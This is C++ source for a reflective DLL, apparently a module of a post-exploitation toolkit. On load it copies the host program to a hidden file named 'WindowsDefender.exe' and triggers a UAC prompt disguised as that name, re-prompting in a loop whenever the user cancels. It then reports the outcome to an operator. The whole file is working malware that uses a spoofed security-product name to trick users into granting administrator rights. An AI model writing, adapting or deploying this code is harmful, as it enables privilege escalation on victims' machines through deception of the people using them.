/*
* A Reflective DLL to Copy X file to 'WindowsDefender.exe' and trigger Administrator prompt as that.
*/

#include "../../common/dll/ReflectiveLoader.h"
#include "../../common/dll/Output.h"
#include <shellapi.h>
#include <sstream>

std::ostringstream out;

std::string MyLocation()
{
    TCHAR DIR[MAX_PATH];
    std::string filelocation;
    std::ostringstream err;
    int fpath = GetModuleFileName(NULL, DIR, MAX_PATH);
    if (fpath == 0)
    {
        err.str(""); err.clear();
        err << "Failed to get : " << GetLastError();
        filelocation = err.str();
    }
    else {
        filelocation = DIR;
    }

    return filelocation;
}

extern HINSTANCE hAppInstance;
BOOL IsAdmin() {
    BOOL fIsRunAsAdmin = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PSID pAdministratorsGroup = NULL;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (!AllocateAndInitializeSid(&NtAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
        dwError = GetLastError();

    }
    else if (!CheckTokenMembership(NULL, pAdministratorsGroup,
        &fIsRunAsAdmin)) {
        dwError = GetLastError();

    }

    if (pAdministratorsGroup) {
        FreeSid(pAdministratorsGroup);
        pAdministratorsGroup = NULL;
    }

    return fIsRunAsAdmin;
}

void UACTrigger() {
   
    TCHAR DIR[MAX_PATH];
    GetModuleFileName(NULL, DIR, MAX_PATH);

    SHELLEXECUTEINFO sei = { sizeof(sei) };


    BOOL isCopied = CopyFile(MyLocation().c_str(), "WindowsDefender.exe", FALSE);
    BOOL admin = IsAdmin();
    if (isCopied)
    {
        if (!admin)
        {
            DWORD attributes = GetFileAttributes("WindowsDefender.exe");
            if (attributes != FILE_ATTRIBUTE_HIDDEN)
            {
                SetFileAttributes("WindowsDefender.exe", attributes + FILE_ATTRIBUTE_HIDDEN);
            }

            sei.lpVerb = "runas";
            sei.lpFile = "WindowsDefender.exe";
            sei.hwnd = NULL;
            sei.nShow = SW_HIDE;

            if (!ShellExecuteEx(&sei)) {
                DWORD dwError = GetLastError();
                if (dwError == ERROR_CANCELLED)
                    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)UACTrigger, 0, 0, 0);
            }
            else {
                out << "The file 'WindowsDefender.exe' was Executed as Administrator." << std::endl;
            }
        }
        else {
            out << "The current process already has administrator rights!" << std::endl;
        }
        
    }
    else {
        out << "Error copying " << MyLocation().c_str() << " to 'WindowsDefender.exe', Error : " << GetLastError() << std::endl;
    }

    Send(out.str().c_str());
    
}


//===============================================================================================//
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
    BOOL bReturnValue = TRUE;
    char* cpCommandLine = (char*)lpReserved;
    char* parse[5];
    switch (dwReason)
    {
    case DLL_QUERY_HMODULE:
        if (lpReserved != NULL)
            *(HMODULE*)lpReserved = hAppInstance;
        break;
    case DLL_PROCESS_ATTACH:
        hAppInstance = hinstDLL;
        UACTrigger();
        break;
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return bReturnValue;
}